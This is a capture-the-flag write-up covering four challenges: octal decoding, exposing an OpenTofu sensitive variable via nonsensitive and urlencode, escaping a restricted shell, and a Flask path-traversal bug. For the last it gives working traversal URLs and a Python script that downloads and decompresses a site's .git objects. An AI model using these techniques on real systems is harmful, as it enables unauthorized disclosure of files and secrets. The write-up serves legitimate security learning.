# Perms
This task is an easy one being solved by 22 teams. We were provided with a `challenge.txt` file containing linux permissions on each line.
With no description or hints provided with the task , i considered calculating permissions using an online calculator. [Link](https://nettools.club/chmod_calc)

Then, I used [Cyberchef](https://gchq.github.io/CyberChef/) with the `from octal` function to decrypt the message and get the flag.


# Openheimer
Task description : terraform's good, but have you tried opentofu?
We were provided with a netcat to interact with the server , which had an OpenTofu console running, along with a main.tf file.

![image](https://github.com/Garroura/CyberTEK/assets/164345052/f0d50c05-3a50-498f-a305-180c316a8e44)

This task was an opportunity to learn about terraform and opentofu, a free terraform fork. [OpenTofu](https://opentofu.org)
With the console running, I attempted various console commands using the documentation . [Doc](https://opentofu.org/docs/cli/commands/console/)
![image](https://github.com/Garroura/CyberTEK/assets/164345052/b04d894e-7137-4ada-af83-370ab58428d9)

To print the value of our variable named `SECRET` , we can use `var.SECRET` but is says `(sensitive value)` which is obvious because `sensitive` is set to `True`.
So we need to baypass this and print the value. 
Going through the terraform commands [link](https://developer.hashicorp.com/terraform/language/functions/nonsensitive) we found that the `nonsensitive` command takes a sensitive value and returns a copy of that value with the sensitive marking removed, thereby exposing the sensitive value.

![image](https://github.com/Garroura/CyberTEK/assets/164345052/f5a1d4eb-2054-4fe8-a0ec-e542a23ec918)


As we can see it is refusing to print the value in plaintext so we will try weak encoding functions starting with `base64encode` .
![image](https://github.com/Garroura/CyberTEK/assets/164345052/c16c0ec1-c480-4987-9d00-b6fa52b0851a)

We can see here thas he is blacklisting some functions so we will try different encoding techniques. As we go through , the `urlencode` function is printing something.
![image](https://github.com/Garroura/CyberTEK/assets/164345052/11087099-314e-4f3c-b2bc-6bb5310d89a3)

Using the urldecode function  in Cyberchef we get our flag in ascii .

`Securinets{oP3N7OfU_I5_4w35Om3_8U7_83c4R3FuL_WH3n_WORkin9_Wi7h_53Cr3Ts}`

# bolbok

Task description : Bolbok is scared of the arcane and has hidden his secret in this restricted shell.
Using the netcat to connect to the server , we have a shell but we can only use some commands. I used the Offsec Handbook, it helps a lot [Offsec](https://0xffsec.com/handbook/shells/restricted-shells/)
To see writable variables i used `export -p`. 
![image](https://github.com/Garroura/CyberTEK/assets/164345052/5ead06c3-2c0b-42be-9246-e45173fba38d)

As we can see the commands we can execute are stored in /usr/bolbok/cmds 

I used `echo /usr/bolbok/cmds/*` to list the directories in the file.

![image](https://github.com/Garroura/CyberTEK/assets/164345052/c670dc26-3286-4384-b9dd-bddd9186413a)

Since we can execute the `ls` command , we can use -l to show all details about the files,  -a to print all hidden files and directories and -R for recursive mode , to list all directrories starting with / ( `ls -laR /`)

Exploring the listed directories we can find a hidden file named .flag in `/usr/share/misc/bolbok/directorysecrets/youwillneverfindthis`

![image](https://github.com/Garroura/CyberTEK/assets/164345052/e791a61a-c182-4254-a529-e927ca7e8f65)

Now , knowing the directory and the flag format we can use `grep -r "Securi" /usr/share/misc/bolbok/secrets/youwillneverfindthis` 

![image](https://github.com/Garroura/CyberTEK/assets/164345052/62d58771-afb8-4d0b-b217-367981c982e9)

`Securinets{wH47_W45_7H47_3x4C7LY?4n_R845h_j41l??_0r_ls_4nd_grep_L3550n}`

# Ekko 
Task description : ls & cat made easy.

We were provided with a web page displaying its source code written in Flask and a dockerfile.

![image](https://github.com/Garroura/CyberTEK/assets/164345052/aec601f1-47d7-4f02-af0d-c97d20afd4b0)

![image](https://github.com/Garroura/CyberTEK/assets/164345052/c380ed98-7b96-4919-9e7c-cdac11895bb6)


Going through the code , we see that we can use the commands `ls` and `cat` with `q` as a query parameter. 
Looking at the docker file , we knew that there is a `.git` file in the app directory so we try to acces it using  `https://ekko.securinets-tekup.tech/ls?q=../app/.git`.

![image](https://github.com/Garroura/CyberTEK/assets/164345052/43012f69-e16d-4894-a58f-f582ea94dd63)


We tried to go through each file and look for sensitive information , so i found this using `https://ekko.securinets-tekup.tech/cat?q=../app/.git/logs/HEAD`

![image](https://github.com/Garroura/CyberTEK/assets/164345052/60c8fbaf-6167-45ae-8be9-c4137dc2f6b8)


The commit history and their hashes revealed that the user added a file named flag.txt to the git, then deleted it. To recover this, we needed to go back to that commit.

Going through the git [docs](https://git-scm.com/book/fr/v2/Les-tripes-de-Git-Les-objets-de-Git)  and doing some researchs , we found that the git commits are stored in the `/.git/objetcs` directory using the commit hash (This is how Git initially stores content - one file per content, named after the SHA-1 checksum of the content and its header. The subdirectory is named after the first 2 characters of the fingerprint and the file after the remaining 38 characters). I tried the hash of the commit containing the flag.txt using `/cat?q=../app/.git/objects/c3/af58e5721c2dbd456ddef869a6a95d0eac473f`
It shows non printable caracters and some encoded strings.

![image](https://github.com/Garroura/CyberTEK/assets/164345052/a1693c54-37b1-430a-a773-4105f2db1587)

Using the same git documentation , i looked for how blobs are encoded in git and i found that it is `zlib` compressed.
We wrote a solver to get all the files in /.git/objects and decompress the content of each file in order to get the flag .
```
import os
import requests, re

url = "https://ekko.securinets-tekup.tech/"

get_objects = requests.get(url + "ls?q=../app/.git/objects/" )
obj = re.findall('\w+', get_objects.text)

destination_folder = "Files"
if get_objects.status_code == 200:
    for i in obj:
        com = requests.get(url + "ls?q=../app/.git/objects/" + i + '/')
        get_com = re.findall('\w+',com.text)
        for commut in get_com:
            blob = requests.get(url + "cat?q=../app/.git/objects/" + i + '/' + commut)
            with open(commut + ".zlib", 'wb') as f:
                f.write(blob.content)
            print("Downloaded successfully:", commut + ".zlib")
        else:
            print("Failed to download:", blob.status_code)
```

````
import os
import zlib
folder_path = '`File'

# Iterate through all files in the folder
for filename in os.listdir(folder_path):
    file_path = os.path.join(folder_path, filename)
    try : 
        with open(file_path,'rb') as f:
            ct= f.read()
        a = (zlib.decompress(ct))
        print(f" : {file_path} :  {a}")
    except : continue
````

`Securinets{y43h_n0w_U_Kn0W_Wh4T_15_917_bL0bS}`

